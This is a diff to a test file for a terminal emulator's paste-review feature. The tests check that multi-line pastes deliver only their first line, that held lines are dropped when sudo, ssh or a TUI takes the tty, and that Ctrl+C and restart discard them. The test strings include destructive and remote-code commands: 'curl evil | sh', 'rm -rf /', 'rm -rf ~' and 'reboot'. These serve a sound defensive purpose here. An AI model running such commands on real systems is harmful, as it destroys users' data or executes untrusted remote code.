@@ -2878,12 +2878,11 @@ ok(not cw.review_pending(), "paste_warn='never': a single-line paste is not held
 eq(_hsent, [b'rm -rf ~'],
    "even under 'never' a single-line paste reaches the shell WITHOUT its submit")
 
-# STAGED multi-line paste: a reviewed non-bracketed multi-line paste must NEVER
-# auto-run an embedded command. The chosen delivery hands only the FIRST line to the
-# prompt (no submit); the rest are STAGED and fed one line per the user's OWN Enter,
-# so every command runs on an explicit keystroke. CANARY: the old code delivered the
-# whole thing with the embedded CR intact -- line 1 auto-ran the instant the paste
-# landed, which is exactly the unseen-second-command the review exists to prevent.
+# HELD multi-line paste (GUARANTEED delivery): a reviewed non-bracketed multi-line
+# paste delivers ONLY line 1; the rest are HELD and inserted one at a time by an
+# EXPLICIT paste gesture, and only while no foreground program owns the tty -- so
+# nothing auto-runs AND a held line can reach only the reviewed shell. Enter never
+# advances the held paste.
 cw.apply_paste_warn('unicode')
 cw._line_buffer = ''
 cw._line_dirty = False
@@ -2895,88 +2894,87 @@ cw.insertFromMimeData(_pmstage)
 ok(cw.review_pending(), 'the multi-line paste is held for review')
 cw.dispatch_pending_paste('stripped')                # user picks Paste (ASCII)
 eq(_hsent, [b'echo one'],
-   'a staged paste delivers ONLY the first line -- the embedded second command never '
-   'reaches the shell on dispatch (nothing auto-runs)')
-eq(cw._staged_paste, ['curl evil | sh'],
-   'the remaining command is STAGED, not written')
+   'delivers ONLY line 1 -- the embedded second command never reaches the shell '
+   '(nothing auto-runs)')
+eq(cw._staged_paste, ['curl evil | sh'], 'the rest is HELD, not written')
 ok(cw._line_dirty, 'the delivered first line marks the prompt unverifiable')
-# the user reads line 1 and presses Enter: it submits and ARMS the next line, but does
-# NOT write it here -- the feed is deferred to the next read that confirms the reviewed
-# shell (no fg program). CANARY: the earlier synchronous feed wrote the staged line on
-# THIS keypress, before the shell could fork a program line 1 launched.
-_hsent.clear()
-key(cw, Qt.Key.Key_Return)
-eq(_hsent, [b'\r'], "the Enter submits line 1 and does NOT write the staged line here")
-ok(cw._stage_feed_pending, 'the next staged line is ARMED, pending a safe read')
-# the next read, back at the shell (no fg program), feeds line 2 -- still un-submitted.
-feed_output(cw, b'$ ')                               # a prompt read: back at the shell
-eq(_hsent, [b'\r', b'curl evil | sh'],
-   'the staged line 2 is fed only once a read confirms the reviewed shell, awaiting Enter')
-eq(cw._staged_paste, [], 'the stage drains once the last line is fed')
-ok(not cw._stage_feed_pending, 'the armed flag clears after the feed')
-# a final Enter submits line 2; nothing remains, so nothing is armed or fed.
-_hsent.clear()
-key(cw, Qt.Key.Key_Return)
-eq(_hsent, [b'\r'], 'the last Enter submits line 2 with nothing left to feed')
-ok(not cw._stage_feed_pending, 'submitting the final line arms nothing')
 
-# SECURITY (reviewdrain16 #1): if the reviewed FIRST line launches a program/shell
-# (sudo -i, ssh, a pager), the staged line must NOT be delivered into THAT context --
-# only into the reviewed shell. Because the feed is deferred to a read, a read that
-# finds a FOREGROUND PROGRAM drops the stage instead of feeding it. CANARY: the
-# synchronous feed wrote the staged line on the keypress, before the program forked, so
-# it reached e.g. a root shell as a live command.
+# CANARY (reviewdrain16 #2): Enter -- and a following read -- must NEVER advance a held
+# paste (the earlier deferred-feed design armed on Enter and fed on the next read).
+_hsent.clear()
+key(cw, Qt.Key.Key_Return)
+eq(_hsent, [b'\r'], 'Enter submits line 1 and writes no held line')
+feed_output(cw, b'$ ')                               # a read after Enter must not feed either
+eq(_hsent, [b'\r'], 'a read after Enter does not feed a held line')
+eq(cw._staged_paste, ['curl evil | sh'], 'the held line survives Enter + a read, untouched')
+
+# the user inserts the next line with an EXPLICIT paste gesture; at an idle prompt (no
+# fg program) it goes to the reviewed shell, still un-submitted (no CR). The clipboard
+# is ignored while a remainder is held.
+_dummy = _QMimePaste()
+_dummy.setText('CLIPBOARD IGNORED WHILE HELD')
+_hsent.clear()
+cw.insertFromMimeData(_dummy)                        # paste gesture advances the held paste
+eq(_hsent, [b'curl evil | sh'],
+   'a paste gesture at an idle prompt inserts the next held line (no CR, awaits Enter)')
+eq(cw._staged_paste, [], 'the held remainder drains as each line is inserted')
+# once drained, a paste gesture is an ordinary clipboard paste again.
+cw._line_dirty = False
+_hsent.clear()
+_pmnew = _QMimePaste()
+_pmnew.setText('plain')
+cw.insertFromMimeData(_pmnew)
+eq(_hsent, [b'plain'], 'with nothing held, Paste is an ordinary clipboard paste')
+cw._staged_paste = []
+cw._line_dirty = False
+
+# SECURITY GUARANTEE (reviewdrain16 #1): a paste gesture inserts a held line ONLY at the
+# reviewed shell. If a foreground program owns the tty (line 1 was sudo -i / ssh / a
+# pager), the gesture is REFUSED and the remainder dropped, so a line reviewed for the
+# shell can NEVER reach that program. Reliable because the gesture is a deliberate
+# keypress at an idle prompt: fg==False then provably == the reviewed shell (any launched
+# program reads fg==True). CANARY: the deferred-feed design wrote the line on a read that
+# raced the fork; this checks fg at the gesture instead.
 _redir = SecureTerminal(command='/bin/cat')
 _rsent = spy_writes(_redir)
-_redir._staged_paste = ['rm -rf /']                  # the dangerous staged line
-_redir._stage_feed_pending = True                    # armed by the Enter that ran line 1
-_redir._bracket_had_fg = False
-_redir.has_foreground_program = lambda: True         # line 1 (sudo -i) now owns the tty
-feed_output(_redir, b'root@host:~# ')                # first read after the redirect
-eq(_rsent, [], 'the staged line is NEVER fed into a program the first line launched')
-eq(_redir._staged_paste, [], 'the stage is dropped once a foreground program is seen')
-ok(not _redir._stage_feed_pending, 'and the armed feed is disarmed')
+_redir._staged_paste = ['rm -rf /']                  # the dangerous held line
+_redir.has_foreground_program = lambda: True         # line 1 (sudo -i) owns the tty now
+_rdummy = _QMimePaste()
+_rdummy.setText('x')
+_redir.insertFromMimeData(_rdummy)                   # explicit paste gesture
+eq(_rsent, [], 'a held line is NEVER inserted while a foreground program owns the tty')
+eq(_redir._staged_paste, [], 'the held remainder is dropped -- the reviewed context is gone')
 _redir.close()
 
-# Ctrl+M / Ctrl+J accept-line advance a staged paste exactly like Enter: arm, not feed.
-cw._staged_paste = ['two', 'three']
-cw._stage_feed_pending = False
-_hsent.clear()
-key(cw, Qt.Key.Key_M, mods=_ctrl_mod)                # accept-line == submit
-eq(_hsent, [b'\r'], 'Ctrl+M submits (the staged line is armed, not written here)')
-ok(cw._stage_feed_pending, 'accept-line arms the next staged line')
-feed_output(cw, b'$ ')                               # safe read feeds it
-eq(_hsent, [b'\r', b'two'], 'the next staged line is fed on the safe read')
-eq(cw._staged_paste, ['three'], 'one staged line consumed')
-cw._staged_paste = []
-cw._stage_feed_pending = False
+# a TUI/foreground context also refuses (the gate is tui_active OR has_foreground_program).
+_redir2 = SecureTerminal(command='/bin/cat', tui=True)
+_r2sent = spy_writes(_redir2)
+_redir2._staged_paste = ['reboot']
+_r2dummy = _QMimePaste()
+_r2dummy.setText('x')
+_redir2.insertFromMimeData(_r2dummy)
+eq(_r2sent, [], 'a TUI context also refuses to insert a held line')
+eq(_redir2._staged_paste, [], 'and drops the remainder')
+_redir2.close()
 
-# Ctrl+C (SIGINT) ABANDONS a staged paste -- the remainder is dropped AND disarmed.
+# Ctrl+C (SIGINT) ABANDONS a held paste.
 cw._staged_paste = ['rm -rf ~', 'reboot']
-cw._stage_feed_pending = True
 _hsent.clear()
 key(cw, Qt.Key.Key_C, mods=_ctrl_mod)
-eq(cw._staged_paste, [], 'Ctrl+C abandons the staged-paste remainder')
-ok(not cw._stage_feed_pending, 'Ctrl+C also disarms a pending feed')
+eq(cw._staged_paste, [], 'Ctrl+C abandons the held-paste remainder')
 
-# an empty staged line (a blank line in the paste) writes nothing but is consumed, so
-# the read that feeds it still advances to the next command.
+# an empty held line (a blank line in the paste) writes nothing but is consumed by the
+# gesture, so the next gesture advances to the following command.
 cw._staged_paste = ['', 'echo done']
-cw._stage_feed_pending = True
+cw._line_dirty = False
 _hsent.clear()
-feed_output(cw, b'$ ')                               # safe read consumes the blank line
-eq(_hsent, [], 'feeding an empty staged line writes no bytes')
+_edummy = _QMimePaste()
+_edummy.setText('x')
+cw.insertFromMimeData(_edummy)
+eq(_hsent, [], 'inserting an empty held line writes no bytes')
 eq(cw._staged_paste, ['echo done'], 'but the blank line is consumed, next line pending')
 cw._staged_paste = []
-cw._stage_feed_pending = False
-
-# _feed_staged_paste is defensively crash-safe with nothing staged: the arming
-# invariant (pending is set only for a non-empty stage, and every clear-path clears
-# both) means callers never reach it that way, but the guard avoids a pop() on empty.
-_hsent.clear()
-cw._staged_paste = []
-cw._feed_staged_paste()
-eq(_hsent, [], '_feed_staged_paste on an empty stage writes nothing (no IndexError)')
+cw._line_dirty = False
 
 # a foreground program taking the tty DROPS a CLI-staged paste: the stage belonged to
 # the shell prompt it was pasted at, not to the program. Exiting the program and
@@ -9120,6 +9118,20 @@ ok(_rsr.restart_as_shell() is True, 'restart_as_shell clears review: restart suc
 ok(_rsr._review_active is False and _rsr._pending_paste is None and bool(_rsr_resolved),
    'restart_as_shell drops a pending paste-review and dismisses the bar (no injection)')
 _rsr.shutdown()
+
+# SECURITY: a STAGED multi-line paste queued for the exited program's shell is dropped
+# on restart too -- else a later unrelated Enter would feed a line reviewed for the OLD
+# program's context into the fresh login shell.
+_rst_stage = SecureTerminal(command=['/bin/sh', '-c', 'exit 0'], tui=False)
+_rst_stage.resize(600, 300)
+_rst_stage.show()
+pump(400)
+_rst_stage._staged_paste = ['rm -rf ~', 'reboot']
+ok(_rst_stage.restart_as_shell() is True,
+   'restart_as_shell (held paste): restart succeeds')
+ok(_rst_stage._staged_paste == [],
+   'restart_as_shell drops a held paste (no leak into the new shell)')
+_rst_stage.shutdown()
 
 
 # --- our own blinking cursor keeps blinking through a selection --------------
